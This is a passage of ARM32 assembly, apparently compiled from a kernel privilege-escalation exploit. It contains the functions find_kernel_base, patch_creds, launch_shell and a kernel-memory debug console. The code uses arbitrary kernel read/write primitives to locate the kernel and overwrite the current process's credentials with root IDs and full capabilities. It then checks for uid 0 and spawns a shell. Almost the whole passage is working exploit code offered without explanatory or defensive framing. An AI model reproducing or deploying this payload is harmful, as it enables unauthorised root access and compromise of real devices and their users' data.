	str	r1, [r0, #4]
	str	r1, [r0]
	b	.LBB9_29
.LBB9_3:
	ldr	r1, .LCPI9_8
.LPC9_6:
	add	r1, pc, r1
	mov	r0, #1
	bl	errx
.LBB9_4:
	ldr	r0, .LCPI9_9
.LPC9_7:
	add	r0, pc, r0
	ldr	r0, [r0, #4]
	ldr	r1, .LCPI9_10
.LPC9_8:
	ldr	r1, [pc, r1]
	ldr	r2, .LCPI9_1
	adds	r1, r1, r2
	adc	r0, r0, #0
	str	r1, [r11, #-24]
	str	r0, [r11, #-20]
	ldr	r0, [r11, #-24]
	ldr	r1, [r11, #-20]
	mov	r2, #904
	orr	r2, r2, #1024
	adds	r0, r0, r2
	adc	r1, r1, #0
	bl	kread_u64
	str	r1, [r11, #-36]
	str	r0, [r11, #-40]
	ldr	r0, [r11, #-24]
	ldr	r1, [r11, #-20]
	adds	r0, r0, #1936
	adc	r1, r1, #0
	bl	kread_u64
	str	r1, [r11, #-28]
	str	r0, [r11, #-32]
	mov	r0, #0
	str	r0, [r11, #-44]
	b	.LBB9_5
.LBB9_5:                                @ =>This Inner Loop Header: Depth=1
	ldr	r0, [r11, #-44]
	cmp	r0, #1
	bgt	.LBB9_29
	b	.LBB9_6
.LBB9_6:                                @   in Loop: Header=BB9_5 Depth=1
	ldr	r0, [r11, #-44]
	sub	r1, r11, #40
	add	r2, r1, r0, lsl #3
	ldr	r0, [r1, r0, lsl #3]
	ldr	r1, [r2, #4]
	add	r2, sp, #16
	mov	r3, #168
	str	r2, [sp]                @ 4-byte Spill
	bl	kread
	ldr	r0, [sp]                @ 4-byte Reload
	orr	r1, r0, #4
	ldrb	r2, [r1], #2
	ldrb	r3, [sp, #21]
	orr	r2, r2, r3, lsl #8
	ldrb	r3, [r1]
	ldrb	r1, [r1, #1]
	orr	r1, r3, r1, lsl #8
	orr	r1, r2, r1, lsl #16
	cmp	r1, #0
	bne	.LBB9_14
	b	.LBB9_7
.LBB9_7:                                @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r0, r0, #8
	ldrb	r1, [r0], #2
	ldrb	r2, [sp, #25]
	orr	r1, r1, r2, lsl #8
	ldrb	r2, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r2, r0, lsl #8
	orr	r0, r1, r0, lsl #16
	cmp	r0, #0
	bne	.LBB9_14
	b	.LBB9_8
.LBB9_8:                                @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r0, r0, #12
	ldrb	r1, [r0], #2
	ldrb	r2, [sp, #29]
	orr	r1, r1, r2, lsl #8
	ldrb	r2, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r2, r0, lsl #8
	orr	r0, r1, r0, lsl #16
	cmp	r0, #0
	bne	.LBB9_14
	b	.LBB9_9
.LBB9_9:                                @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r0, r0, #16
	ldrb	r1, [r0], #2
	ldrb	r2, [sp, #33]
	orr	r1, r1, r2, lsl #8
	ldrb	r2, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r2, r0, lsl #8
	orr	r0, r1, r0, lsl #16
	cmp	r0, #0
	bne	.LBB9_14
	b	.LBB9_10
.LBB9_10:                               @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r0, r0, #20
	ldrb	r1, [r0], #2
	ldrb	r2, [sp, #37]
	orr	r1, r1, r2, lsl #8
	ldrb	r2, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r2, r0, lsl #8
	orr	r0, r1, r0, lsl #16
	cmp	r0, #0
	bne	.LBB9_14
	b	.LBB9_11
.LBB9_11:                               @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r0, r0, #24
	ldrb	r1, [r0], #2
	ldrb	r2, [sp, #41]
	orr	r1, r1, r2, lsl #8
	ldrb	r2, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r2, r0, lsl #8
	orr	r0, r1, r0, lsl #16
	cmp	r0, #0
	bne	.LBB9_14
	b	.LBB9_12
.LBB9_12:                               @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r0, r0, #28
	ldrb	r1, [r0], #2
	ldrb	r2, [sp, #45]
	orr	r1, r1, r2, lsl #8
	ldrb	r2, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r2, r0, lsl #8
	orr	r0, r1, r0, lsl #16
	cmp	r0, #0
	bne	.LBB9_14
	b	.LBB9_13
.LBB9_13:                               @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r0, r0, #32
	ldrb	r1, [r0], #2
	ldrb	r2, [sp, #49]
	orr	r1, r1, r2, lsl #8
	ldrb	r2, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r2, r0, lsl #8
	orr	r0, r1, r0, lsl #16
	cmp	r0, #0
	beq	.LBB9_17
	b	.LBB9_14
.LBB9_14:
	ldr	r0, .LCPI9_11
.LPC9_9:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	beq	.LBB9_16
	b	.LBB9_15
.LBB9_15:
	ldr	r0, .LCPI9_12
.LPC9_10:
	add	r0, pc, r0
	bl	warnx
	ldr	r0, .LCPI9_13
.LPC9_11:
	add	r0, pc, r0
	mov	r1, #0
	str	r1, [r0, #4]
	str	r1, [r0]
	b	.LBB9_29
.LBB9_16:
	ldr	r1, .LCPI9_14
.LPC9_12:
	add	r1, pc, r1
	mov	r0, #1
	bl	errx
.LBB9_17:                               @   in Loop: Header=BB9_5 Depth=1
	mov	r0, #63
	str	r0, [sp, #12]
	mvn	r0, #0
	str	r0, [sp, #8]
	add	r0, sp, #16
	add	r1, r0, #40
	add	r0, r0, #44
	ldrb	r2, [r0], #2
	ldrb	r3, [sp, #57]
	ldrb	r12, [sp, #61]
	orr	r2, r2, r12, lsl #8
	ldrb	r12, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r12, r0, lsl #8
	orr	r0, r2, r0, lsl #16
	ldrb	r2, [r1], #2
	orr	r2, r2, r3, lsl #8
	ldrb	r3, [r1]
	ldrb	r1, [r1, #1]
	orr	r1, r3, r1, lsl #8
	orr	r1, r2, r1, lsl #16
	orr	r0, r1, r0
	cmp	r0, #0
	bne	.LBB9_22
	b	.LBB9_18
.LBB9_18:                               @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r1, r0, #48
	ldrb	r2, [r1], #2
	ldrb	r3, [sp, #65]
	ldrb	r12, [sp, #69]
	orr	r2, r2, r3, lsl #8
	ldrb	r3, [r1]
	ldrb	r1, [r1, #1]
	orr	r1, r3, r1, lsl #8
	orr	r1, r2, r1, lsl #16
	add	r0, r0, #52
	ldrb	r2, [r0], #2
	orr	r2, r2, r12, lsl #8
	ldrb	r3, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r3, r0, lsl #8
	orr	r0, r2, r0, lsl #16
	eor	r0, r0, #63
	mvn	r1, r1
	orr	r0, r1, r0
	cmp	r0, #0
	bne	.LBB9_22
	b	.LBB9_19
.LBB9_19:                               @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r1, r0, #56
	ldrb	r2, [r1], #2
	ldrb	r3, [sp, #73]
	ldrb	r12, [sp, #77]
	orr	r2, r2, r3, lsl #8
	ldrb	r3, [r1]
	ldrb	r1, [r1, #1]
	orr	r1, r3, r1, lsl #8
	orr	r1, r2, r1, lsl #16
	add	r0, r0, #60
	ldrb	r2, [r0], #2
	orr	r2, r2, r12, lsl #8
	ldrb	r3, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r3, r0, lsl #8
	orr	r0, r2, r0, lsl #16
	eor	r0, r0, #63
	mvn	r1, r1
	orr	r0, r1, r0
	cmp	r0, #0
	bne	.LBB9_22
	b	.LBB9_20
.LBB9_20:                               @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r1, r0, #64
	ldrb	r2, [r1], #2
	ldrb	r3, [sp, #81]
	ldrb	r12, [sp, #85]
	orr	r2, r2, r3, lsl #8
	ldrb	r3, [r1]
	ldrb	r1, [r1, #1]
	orr	r1, r3, r1, lsl #8
	orr	r1, r2, r1, lsl #16
	add	r0, r0, #68
	ldrb	r2, [r0], #2
	orr	r2, r2, r12, lsl #8
	ldrb	r3, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r3, r0, lsl #8
	orr	r0, r2, r0, lsl #16
	eor	r0, r0, #63
	mvn	r1, r1
	orr	r0, r1, r0
	cmp	r0, #0
	bne	.LBB9_22
	b	.LBB9_21
.LBB9_21:                               @   in Loop: Header=BB9_5 Depth=1
	add	r0, sp, #16
	add	r1, r0, #72
	add	r0, r0, #76
	ldrb	r2, [r0], #2
	ldrb	r3, [sp, #89]
	ldrb	r12, [sp, #93]
	orr	r2, r2, r12, lsl #8
	ldrb	r12, [r0]
	ldrb	r0, [r0, #1]
	orr	r0, r12, r0, lsl #8
	orr	r0, r2, r0, lsl #16
	ldrb	r2, [r1], #2
	orr	r2, r2, r3, lsl #8
	ldrb	r3, [r1]
	ldrb	r1, [r1, #1]
	orr	r1, r3, r1, lsl #8
	orr	r1, r2, r1, lsl #16
	orr	r0, r1, r0
	cmp	r0, #0
	beq	.LBB9_25
	b	.LBB9_22
.LBB9_22:
	ldr	r0, .LCPI9_15
.LPC9_13:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	beq	.LBB9_24
	b	.LBB9_23
.LBB9_23:
	ldr	r0, .LCPI9_16
.LPC9_14:
	add	r0, pc, r0
	bl	warnx
	ldr	r0, .LCPI9_17
.LPC9_15:
	add	r0, pc, r0
	mov	r1, #0
	str	r1, [r0, #4]
	str	r1, [r0]
	b	.LBB9_29
.LBB9_24:
	ldr	r1, .LCPI9_18
.LPC9_16:
	add	r1, pc, r1
	mov	r0, #1
	bl	errx
.LBB9_25:                               @   in Loop: Header=BB9_5 Depth=1
	ldr	r0, [r11, #-40]
	ldr	r1, [r11, #-36]
	ldr	r2, [r11, #-32]
	ldr	r3, [r11, #-28]
	eor	r1, r1, r3
	eor	r0, r0, r2
	orr	r0, r0, r1
	cmp	r0, #0
	bne	.LBB9_27
	b	.LBB9_26
.LBB9_26:
	b	.LBB9_29
.LBB9_27:                               @   in Loop: Header=BB9_5 Depth=1
	b	.LBB9_28
.LBB9_28:                               @   in Loop: Header=BB9_5 Depth=1
	ldr	r0, [r11, #-44]
	add	r0, r0, #1
	str	r0, [r11, #-44]
	b	.LBB9_5
.LBB9_29:
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.30:
.LCPI9_0:
	.long	4261219640              @ 0xfdfd0d38
.LCPI9_1:
	.long	33707984                @ 0x20257d0
.LCPI9_2:
	.long	current-(.LPC9_0+8)
.LCPI9_3:
	.long	current-(.LPC9_1+8)
.LCPI9_4:
	.long	kernel_base-(.LPC9_2+8)
.LCPI9_5:
	.long	debugging-(.LPC9_3+8)
.LCPI9_6:
	.long	.L.str.24-(.LPC9_4+8)
.LCPI9_7:
	.long	kernel_base-(.LPC9_5+8)
.LCPI9_8:
	.long	.L.str.24-(.LPC9_6+8)
.LCPI9_9:
	.long	kernel_base-(.LPC9_7+8)
.LCPI9_10:
	.long	kernel_base-(.LPC9_8+8)
.LCPI9_11:
	.long	debugging-(.LPC9_9+8)
.LCPI9_12:
	.long	.L.str.25-(.LPC9_10+8)
.LCPI9_13:
	.long	kernel_base-(.LPC9_11+8)
.LCPI9_14:
	.long	.L.str.25-(.LPC9_12+8)
.LCPI9_15:
	.long	debugging-(.LPC9_13+8)
.LCPI9_16:
	.long	.L.str.25-(.LPC9_14+8)
.LCPI9_17:
	.long	kernel_base-(.LPC9_15+8)
.LCPI9_18:
	.long	.L.str.25-(.LPC9_16+8)
.Lfunc_end9:
	.size	find_kernel_base, .Lfunc_end9-find_kernel_base
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	patch_creds             @ -- Begin function patch_creds
	.p2align	2
	.type	patch_creds,%function
	.code	32                      @ @patch_creds
patch_creds:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#80
	sub	sp, sp, #80
	ldr	r0, .LCPI10_1
.LPC10_0:
	add	r0, pc, r0
	ldr	r1, [r0, #4]
	ldr	r2, .LCPI10_2
.LPC10_1:
	ldr	r2, [pc, r2]
	mov	r3, #904
	orr	r3, r3, #1024
	adds	r2, r2, r3
	adc	r1, r1, #0
	str	r0, [sp, #36]           @ 4-byte Spill
	mov	r0, r2
	bl	kread_u64
	str	r1, [r11, #-12]
	str	r0, [r11, #-16]
	ldr	r0, [sp, #36]           @ 4-byte Reload
	ldr	r1, [r0, #4]
	ldr	r2, .LCPI10_3
.LPC10_2:
	ldr	r2, [pc, r2]
	adds	r0, r2, #1936
	adc	r1, r1, #0
	bl	kread_u64
	str	r1, [r11, #-4]
	str	r0, [r11, #-8]
	ldr	r0, [r11, #-16]
	ldr	r1, [r11, #-12]
	adds	r0, r0, #4
	adc	r1, r1, #0
	bl	kread_u32
	str	r0, [sp, #32]           @ 4-byte Spill
	str	r1, [sp, #28]           @ 4-byte Spill
	bl	getuid
	ldr	r1, [sp, #32]           @ 4-byte Reload
	eor	r0, r1, r0
	ldr	r2, [sp, #28]           @ 4-byte Reload
	orr	r0, r0, r2
	cmp	r0, #0
	beq	.LBB10_2
	b	.LBB10_1
.LBB10_1:
	ldr	r1, .LCPI10_4
.LPC10_3:
	add	r1, pc, r1
	mov	r0, #1
	bl	errx
.LBB10_2:
	ldr	r0, [r11, #-16]
	ldr	r1, [r11, #-12]
	ldr	r2, [r11, #-8]
	ldr	r3, [r11, #-4]
	eor	r1, r1, r3
	eor	r0, r0, r2
	orr	r0, r0, r1
	cmp	r0, #0
	beq	.LBB10_6
	b	.LBB10_3
.LBB10_3:
	ldr	r0, [r11, #-8]
	ldr	r1, [r11, #-4]
	adds	r0, r0, #4
	adc	r1, r1, #0
	bl	kread_u32
	str	r0, [sp, #24]           @ 4-byte Spill
	str	r1, [sp, #20]           @ 4-byte Spill
	bl	getuid
	ldr	r1, [sp, #24]           @ 4-byte Reload
	eor	r0, r1, r0
	ldr	r2, [sp, #20]           @ 4-byte Reload
	orr	r0, r0, r2
	cmp	r0, #0
	beq	.LBB10_5
	b	.LBB10_4
.LBB10_4:
	ldr	r1, .LCPI10_5
.LPC10_4:
	add	r1, pc, r1
	mov	r0, #1
	bl	errx
.LBB10_5:
	b	.LBB10_6
.LBB10_6:
	ldr	r0, .LCPI10_6
.LPC10_5:
	add	r0, pc, r0
	ldr	r0, [r0, #4]
	ldr	r1, .LCPI10_7
.LPC10_6:
	ldr	r1, [pc, r1]
	ldr	r2, .LCPI10_0
	adds	r1, r1, r2
	adc	r0, r0, #0
	mov	r2, #0
	str	r0, [sp, #16]           @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #16]           @ 4-byte Reload
	str	r2, [sp, #12]           @ 4-byte Spill
	bl	kwrite_u32
	ldr	r0, [sp, #12]           @ 4-byte Reload
	str	r0, [r11, #-20]
	b	.LBB10_7
.LBB10_7:                               @ =>This Inner Loop Header: Depth=1
	ldr	r0, [r11, #-20]
	cmp	r0, #1
	bgt	.LBB10_12
	b	.LBB10_8
.LBB10_8:                               @   in Loop: Header=BB10_7 Depth=1
	ldr	r0, [r11, #-20]
	sub	r1, r11, #16
	add	r2, r1, r0, lsl #3
	ldr	r0, [r1, r0, lsl #3]
	ldr	r1, [r2, #4]
	str	r1, [r11, #-28]
	str	r0, [r11, #-32]
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #4
	adc	r1, r1, #0
	mov	r2, #0
	str	r2, [sp, #8]            @ 4-byte Spill
	bl	kwrite_u32
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #8
	adc	r1, r1, #0
	ldr	r2, [sp, #8]            @ 4-byte Reload
	bl	kwrite_u32
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #12
	adc	r1, r1, #0
	ldr	r2, [sp, #8]            @ 4-byte Reload
	bl	kwrite_u32
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #16
	adc	r1, r1, #0
	ldr	r2, [sp, #8]            @ 4-byte Reload
	bl	kwrite_u32
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #20
	adc	r1, r1, #0
	ldr	r2, [sp, #8]            @ 4-byte Reload
	bl	kwrite_u32
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #24
	adc	r1, r1, #0
	ldr	r2, [sp, #8]            @ 4-byte Reload
	bl	kwrite_u32
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #28
	adc	r1, r1, #0
	ldr	r2, [sp, #8]            @ 4-byte Reload
	bl	kwrite_u32
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #32
	adc	r1, r1, #0
	ldr	r2, [sp, #8]            @ 4-byte Reload
	bl	kwrite_u32
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #36
	adc	r1, r1, #0
	ldr	r2, [sp, #8]            @ 4-byte Reload
	bl	kwrite_u32
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #40
	adc	r1, r1, #0
	mvn	r2, #0
	str	r2, [sp, #4]            @ 4-byte Spill
	ldr	r3, [sp, #4]            @ 4-byte Reload
	bl	kwrite_u64
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #48
	adc	r1, r1, #0
	ldr	r2, [sp, #4]            @ 4-byte Reload
	ldr	r3, [sp, #4]            @ 4-byte Reload
	bl	kwrite_u64
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #56
	adc	r1, r1, #0
	ldr	r2, [sp, #4]            @ 4-byte Reload
	ldr	r3, [sp, #4]            @ 4-byte Reload
	bl	kwrite_u64
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #64
	adc	r1, r1, #0
	ldr	r2, [sp, #4]            @ 4-byte Reload
	ldr	r3, [sp, #4]            @ 4-byte Reload
	bl	kwrite_u64
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #72
	adc	r1, r1, #0
	ldr	r2, [sp, #4]            @ 4-byte Reload
	ldr	r3, [sp, #4]            @ 4-byte Reload
	bl	kwrite_u64
	ldr	r0, [r11, #-32]
	ldr	r1, [r11, #-28]
	adds	r0, r0, #120
	adc	r1, r1, #0
	bl	kread_u64
	str	r1, [sp, #44]
	str	r0, [sp, #40]
	ldr	r0, [sp, #40]
	ldr	r1, [sp, #44]
	mov	r2, #1
	str	r2, [sp]                @ 4-byte Spill
	bl	kwrite_u32
	ldr	r0, [sp, #40]
	ldr	r1, [sp, #44]
	adds	r0, r0, #4
	adc	r1, r1, #0
	ldr	r2, [sp]                @ 4-byte Reload
	bl	kwrite_u32
	ldr	r0, [r11, #-16]
	ldr	r1, [r11, #-12]
	ldr	r2, [r11, #-8]
	ldr	r3, [r11, #-4]
	eor	r1, r1, r3
	eor	r0, r0, r2
	orr	r0, r0, r1
	cmp	r0, #0
	bne	.LBB10_10
	b	.LBB10_9
.LBB10_9:
	b	.LBB10_12
.LBB10_10:                              @   in Loop: Header=BB10_7 Depth=1
	b	.LBB10_11
.LBB10_11:                              @   in Loop: Header=BB10_7 Depth=1
	ldr	r0, [r11, #-20]
	add	r0, r0, #1
	str	r0, [r11, #-20]
	b	.LBB10_7
.LBB10_12:
	bl	getuid
	cmp	r0, #0
	beq	.LBB10_14
	b	.LBB10_13
.LBB10_13:
	ldr	r1, .LCPI10_8
.LPC10_7:
	add	r1, pc, r1
	mov	r0, #1
	bl	errx
.LBB10_14:
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.15:
.LCPI10_0:
	.long	37545128                @ 0x23ce4a8
.LCPI10_1:
	.long	current-(.LPC10_0+8)
.LCPI10_2:
	.long	current-(.LPC10_1+8)
.LCPI10_3:
	.long	current-(.LPC10_2+8)
.LCPI10_4:
	.long	.L.str.26-(.LPC10_3+8)
.LCPI10_5:
	.long	.L.str.27-(.LPC10_4+8)
.LCPI10_6:
	.long	kernel_base-(.LPC10_5+8)
.LCPI10_7:
	.long	kernel_base-(.LPC10_6+8)
.LCPI10_8:
	.long	.L.str.28-(.LPC10_7+8)
.Lfunc_end10:
	.size	patch_creds, .Lfunc_end10-patch_creds
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	launch_shell            @ -- Begin function launch_shell
	.p2align	2
	.type	launch_shell,%function
	.code	32                      @ @launch_shell
launch_shell:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#8
	sub	sp, sp, #8
	ldr	r0, .LCPI11_0
.LPC11_0:
	add	r0, pc, r0
	mov	r2, #0
	str	r0, [sp, #4]            @ 4-byte Spill
	ldr	r1, [sp, #4]            @ 4-byte Reload
	bl	execl
	cmn	r0, #1
	bne	.LBB11_2
	b	.LBB11_1
.LBB11_1:
	ldr	r1, .LCPI11_1
.LPC11_1:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB11_2:
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.3:
.LCPI11_0:
	.long	.L.str.29-(.LPC11_0+8)
.LCPI11_1:
	.long	.L.str.30-(.LPC11_1+8)
.Lfunc_end11:
	.size	launch_shell, .Lfunc_end11-launch_shell
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	launch_debug_console    @ -- Begin function launch_debug_console
	.p2align	2
	.type	launch_debug_console,%function
	.code	32                      @ @launch_debug_console
launch_debug_console:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#8
	sub	sp, sp, #8
	ldr	r0, .LCPI12_0
.LPC12_0:
	add	r0, pc, r0
	bl	printf
	str	r0, [sp, #4]            @ 4-byte Spill
	bl	con_loop
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.1:
.LCPI12_0:
	.long	.L.str.31-(.LPC12_0+8)
.Lfunc_end12:
	.size	launch_debug_console, .Lfunc_end12-launch_debug_console
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	con_loop                @ -- Begin function con_loop
	.p2align	2
	.type	con_loop,%function
	.code	32                      @ @con_loop
con_loop:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#88
	sub	sp, sp, #88
	mov	r0, #1
	str	r0, [r11, #-16]
	b	.LBB13_1
.LBB13_1:                               @ =>This Loop Header: Depth=1
                                        @     Child Loop BB13_35 Depth 2
	ldr	r0, [r11, #-16]
	cmp	r0, #0
	beq	.LBB13_56
	b	.LBB13_2
.LBB13_2:                               @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, .LCPI13_4
.LPC13_0:
	add	r0, pc, r0
	bl	printf
	mov	r1, #0
	str	r1, [r11, #-20]
	str	r1, [r11, #-24]
	ldr	r1, .LCPI13_5
.LPC13_1:
	ldr	r1, [pc, r1]
	ldr	r2, [r1]
	sub	r1, r11, #20
	sub	r3, r11, #24
	str	r0, [sp, #44]           @ 4-byte Spill
	mov	r0, r1
	mov	r1, r3
	bl	getline
	cmn	r0, #1
	bne	.LBB13_4
	b	.LBB13_3
.LBB13_3:
	ldr	r1, .LCPI13_6
.LPC13_2:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB13_4:                               @   in Loop: Header=BB13_1 Depth=1
	mov	r0, #0
	str	r0, [r11, #-28]
	ldr	r0, [r11, #-20]
	ldr	r1, .LCPI13_7
.LPC13_3:
	add	r1, pc, r1
	bl	strtok
	str	r0, [r11, #-32]
	ldr	r0, [r11, #-32]
	cmp	r0, #0
	beq	.LBB13_8
	b	.LBB13_5
.LBB13_5:                               @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	ldr	r1, .LCPI13_8
.LPC13_4:
	add	r1, pc, r1
	bl	strcmp
	cmp	r0, #0
	bne	.LBB13_8
	b	.LBB13_6
.LBB13_6:                               @   in Loop: Header=BB13_1 Depth=1
	sub	r0, r11, #32
	bl	con_consume
	cmp	r0, #0
	beq	.LBB13_8
	b	.LBB13_7
.LBB13_7:                               @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, .LCPI13_9
.LPC13_5:
	add	r0, pc, r0
	ldr	r3, [r0, #4]
	ldr	r2, .LCPI13_10
.LPC13_6:
	ldr	r2, [pc, r2]
	ldr	r1, .LCPI13_11
.LPC13_7:
	add	r1, pc, r1
	str	r0, [sp, #40]           @ 4-byte Spill
	mov	r0, r1
	bl	printf
	ldr	r1, [sp, #40]           @ 4-byte Reload
	ldr	r2, [r1, #4]
	ldr	r3, .LCPI13_12
.LPC13_8:
	ldr	r3, [pc, r3]
	ldr	r12, .LCPI13_0
	adds	r3, r3, r12
	adc	r2, r2, #0
	ldr	r12, .LCPI13_13
.LPC13_9:
	add	r12, pc, r12
	str	r0, [sp, #36]           @ 4-byte Spill
	mov	r0, r12
	str	r2, [sp, #32]           @ 4-byte Spill
	mov	r2, r3
	ldr	r3, [sp, #32]           @ 4-byte Reload
	bl	printf
	ldr	r1, [sp, #40]           @ 4-byte Reload
	ldr	r2, [r1, #4]
	ldr	r3, .LCPI13_14
.LPC13_10:
	ldr	r3, [pc, r3]
	ldr	r12, .LCPI13_1
	adds	r3, r3, r12
	adc	r2, r2, #0
	ldr	r12, .LCPI13_15
.LPC13_11:
	add	r12, pc, r12
	str	r0, [sp, #28]           @ 4-byte Spill
	mov	r0, r12
	str	r2, [sp, #24]           @ 4-byte Spill
	mov	r2, r3
	ldr	r3, [sp, #24]           @ 4-byte Reload
	bl	printf
	ldr	r1, [sp, #40]           @ 4-byte Reload
	ldr	r2, [r1, #4]
	ldr	r3, .LCPI13_16
.LPC13_12:
	ldr	r3, [pc, r3]
	ldr	r12, .LCPI13_2
	adds	r3, r3, r12
	adc	r2, r2, #0
	ldr	r12, .LCPI13_17
.LPC13_13:
	add	r12, pc, r12
	str	r0, [sp, #20]           @ 4-byte Spill
	mov	r0, r12
	str	r2, [sp, #16]           @ 4-byte Spill
	mov	r2, r3
	ldr	r3, [sp, #16]           @ 4-byte Reload
	bl	printf
	ldr	r1, [sp, #40]           @ 4-byte Reload
	ldr	r2, [r1, #4]
	ldr	r3, .LCPI13_18
.LPC13_14:
	ldr	r3, [pc, r3]
	ldr	r12, .LCPI13_3
	adds	r3, r3, r12
	adc	r2, r2, #0
	ldr	r12, .LCPI13_19
.LPC13_15:
	add	r12, pc, r12
	str	r0, [sp, #12]           @ 4-byte Spill
	mov	r0, r12
	str	r2, [sp, #8]            @ 4-byte Spill
	mov	r2, r3
	ldr	r3, [sp, #8]            @ 4-byte Reload
	bl	printf
	ldr	r1, .LCPI13_20
.LPC13_16:
	add	r1, pc, r1
	ldr	r3, [r1, #4]
	ldr	r2, .LCPI13_21
.LPC13_17:
	ldr	r2, [pc, r2]
	ldr	r1, .LCPI13_22
.LPC13_18:
	add	r1, pc, r1
	str	r0, [sp, #4]            @ 4-byte Spill
	mov	r0, r1
	bl	printf
	mov	r1, #1
	str	r1, [r11, #-28]
	b	.LBB13_53
.LBB13_8:                               @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	cmp	r0, #0
	beq	.LBB13_18
	b	.LBB13_9
.LBB13_9:                               @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-32]
	ldr	r1, .LCPI13_23
.LPC13_19:
	add	r1, pc, r1
	bl	strcmp
	cmp	r0, #0
	bne	.LBB13_18
	b	.LBB13_10
.LBB13_10:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r1, .LCPI13_24
.LPC13_20:
	add	r1, pc, r1
	mov	r0, #0
	bl	strtok
	sub	r1, r11, #8
	bl	con_parse_hexstring
	cmp	r0, #0
	beq	.LBB13_17
	b	.LBB13_11
.LBB13_11:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r1, .LCPI13_25
.LPC13_21:
	add	r1, pc, r1
	mov	r0, #0
	bl	strtok
	sub	r1, r11, #12
	bl	con_parse_number
	cmp	r0, #0
	beq	.LBB13_17
	b	.LBB13_12
.LBB13_12:                              @   in Loop: Header=BB13_1 Depth=1
	sub	r0, r11, #32
	bl	con_consume
	cmp	r0, #0
	beq	.LBB13_17
	b	.LBB13_13
.LBB13_13:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-12]
	cmp	r0, #0
	beq	.LBB13_17
	b	.LBB13_14
.LBB13_14:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-12]
	cmp	r0, #4096
	bhi	.LBB13_17
	b	.LBB13_15
.LBB13_15:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-12]
	sub	r0, r0, #1
	ldr	r1, [r11, #-8]
	ldr	r2, [r11, #-4]
	mvn	r2, r2
	mvn	r1, r1
	subs	r0, r1, r0
	sbcs	r1, r2, #0
	blo	.LBB13_17
	b	.LBB13_16
.LBB13_16:                              @   in Loop: Header=BB13_1 Depth=1
	ldr	r0, [r11, #-8]
	ldr	r1, [r11, #-4]
	ldr	r2, [r11, #-12]
	bl	con_kdump
	mov	r0, #1
	str	r0, [r11, #-28]
	b	.LBB13_17
.LBB13_17:                              @   in Loop: Header=BB13_1 Depth=1
	b	.LBB13_52
